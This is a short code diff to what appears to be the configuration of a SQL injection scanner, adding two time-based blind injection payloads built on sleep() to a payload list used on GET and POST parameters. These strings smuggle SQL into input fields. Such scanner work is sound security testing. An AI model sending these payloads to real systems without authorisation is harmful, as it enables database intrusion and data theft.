@@ -12,6 +12,8 @@ sqli_config = {
         "\"xor(sleep(%d))or\"",
         "1 xor(sleep(%d))",
         ",sleep(%d)",
+        "'or(1=sleep(%d))or''='",
+        "\"or(1=sleep(%d))or\"\"=\"",
     ],
 
     "scan_postion": ["get", "post"],
